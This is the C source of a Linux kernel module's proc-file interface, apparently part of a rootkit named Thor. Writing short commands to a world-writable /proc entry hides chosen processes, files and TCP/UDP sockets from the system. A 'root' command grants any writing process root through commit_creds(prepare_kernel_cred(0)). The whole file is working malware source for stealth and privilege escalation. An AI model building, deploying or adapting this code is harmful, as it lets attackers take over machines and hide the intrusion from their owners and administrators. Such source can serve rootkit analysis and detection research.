#include "procfile.h"

#include "filehider.h"
#include "helper.h"
#include "logging.h"
#include "prochider.h"
#include "sockethider.h"

#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/version.h>

/* function prototypes */
static int procfile_read(struct seq_file *m, void *v);
static int procfile_open(struct inode *inode, struct file *file);
static ssize_t procfile_write(struct file *file, const char __user *buffer,
        size_t count, loff_t *ppos);

/* procfile */
struct proc_dir_entry *procfile;

/* file operatiosn for procfile */
static struct file_operations procfile_fops = {
    .owner = THIS_MODULE,
    .open = procfile_open,
    .read = seq_read,
    .write = procfile_write,
    .llseek = seq_lseek,
    .release = single_release,
};

int procfile_init(void)
{
    // allocate file in proc
    procfile = proc_create(THOR_PROCFILE, 0666, NULL, &procfile_fops);
    if (procfile == NULL) {
        LOG_ERROR("could not create proc entry");
        return -1;
    }

    return 0;
}

/* read callback for procfile */
static int procfile_read(struct seq_file *m, void *v)
{
    seq_printf(m,
        "usage:\n"\
        "   echo hp PID > /proc/" THOR_PROCFILE " (hides process PID)\n"\
        "   echo up PID > /proc/" THOR_PROCFILE " (unhides process PID)\n"\
        "   echo upa > /proc/" THOR_PROCFILE " (unhide all PIDs)\n"\
        "   echo hf FILE > /proc/" THOR_PROCFILE " (hide file FILE)\n"\
        "   echo uf FILE > /proc/" THOR_PROCFILE " (unhide file FILE)\n"\
        "   echo ufa > /proc/" THOR_PROCFILE " (unhide all files)\n"\
        "   echo ht4s PORT > /proc/" THOR_PROCFILE " (hide tcp4 socket)\n"\
        "   echo ut4s PORT > /proc/" THOR_PROCFILE " (unhide tcp4 socket)\n"\
        "   echo ut4a > /proc/" THOR_PROCFILE " (unhide all tcp4 sockets)\n"\
        "   echo ht6s PORT > /proc/" THOR_PROCFILE " (hide tcp6 socket)\n"\
        "   echo ut6s PORT > /proc/" THOR_PROCFILE " (unhide tcp6 socket)\n"\
        "   echo ut6a > /proc/" THOR_PROCFILE " (unhide all tcp6 sockets)\n"\
        "   echo hu4s PORT > /proc/" THOR_PROCFILE " (hide udp4 socket)\n"\
        "   echo uu4s PORT > /proc/" THOR_PROCFILE " (unhide udp4 socket)\n"\
        "   echo uu4a > /proc/" THOR_PROCFILE " (unhide all udp4 sockets)\n"\
        "   echo hu6s PORT > /proc/" THOR_PROCFILE " (hide udp6 socket)\n"\
        "   echo uu6s PORT > /proc/" THOR_PROCFILE " (unhide udp6 socket)\n"\
        "   echo uu6a > /proc/" THOR_PROCFILE " (unhide all udp6 sockets)\n"\
        "   echo root > /proc/" THOR_PROCFILE " (gain root privileges)\n");
    return 0;
}

/* open callback for procfile */
static int procfile_open(struct inode *inode, struct file *file)
{
    return single_open(file, procfile_read, NULL);
}

/* write callback for procfile */
static ssize_t procfile_write(struct file *file, const char __user *buffer,
        size_t count, loff_t *ppos)
{
    int r;
    if (strncmp(buffer, "hp ", MIN(3, count)) == 0) {
        add_to_pid_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "upa", MIN(3, count)) == 0) {
        clear_pid_list();
    } else if (strncmp(buffer, "up ", MIN(3, count)) == 0) {
        remove_from_pid_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "hf ", MIN(3, count)) == 0) {
        add_to_file_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "ufa", MIN(3, count)) == 0) {
        clear_file_list();
    } else if (strncmp(buffer, "uf ", MIN(3, count)) == 0) {
        remove_from_file_list(buffer + 3, count - 3);
    } else if(strncmp(buffer, "ht4s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        add_to_tcp4_list((int) port);
    } else if(strncmp(buffer, "ut4s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        remove_from_tcp4_list((int) port);
    } else if(strncmp(buffer, "ut4a", MIN(4, count)) == 0) {
        clear_tcp4_list();
    } else if(strncmp(buffer, "ht6s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        add_to_tcp6_list((int) port);
    } else if(strncmp(buffer, "ut6s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        remove_from_tcp6_list((int) port);
    } else if(strncmp(buffer, "ut6a", MIN(4, count)) == 0) {
        clear_tcp6_list();
    } else if(strncmp(buffer, "hu4s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        add_to_udp4_list((int) port);
    } else if(strncmp(buffer, "uu4s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        remove_from_udp4_list((int) port);
    } else if(strncmp(buffer, "uu4a", MIN(4, count)) == 0) {
        clear_udp4_list();
    } else if(strncmp(buffer, "hu6s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        add_to_udp6_list((int) port);
    } else if(strncmp(buffer, "uu6s ", MIN(5, count)) == 0) {
        long port;
        char s_port[12];
        strncpy(s_port, buffer+5, MIN(12, count - 5));
        s_port[MIN(12, count-5)-1] = 0;
        r = kstrtol(s_port, 10, &port);
        remove_from_udp6_list((int) port);
    } else if(strncmp(buffer, "uu6a", MIN(4, count)) == 0) {
        clear_udp6_list();
    } else if (strncmp(buffer, "root", MIN(4, count)) == 0) {
        commit_creds(prepare_kernel_cred(0));
    }
    return count;
}

void procfile_cleanup(void)
{
    if (procfile != NULL) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
        remove_proc_entry(THOR_PROCFILE, procfile->parent);
#else
        proc_remove(procfile);
#endif
        procfile = NULL;
    }
}
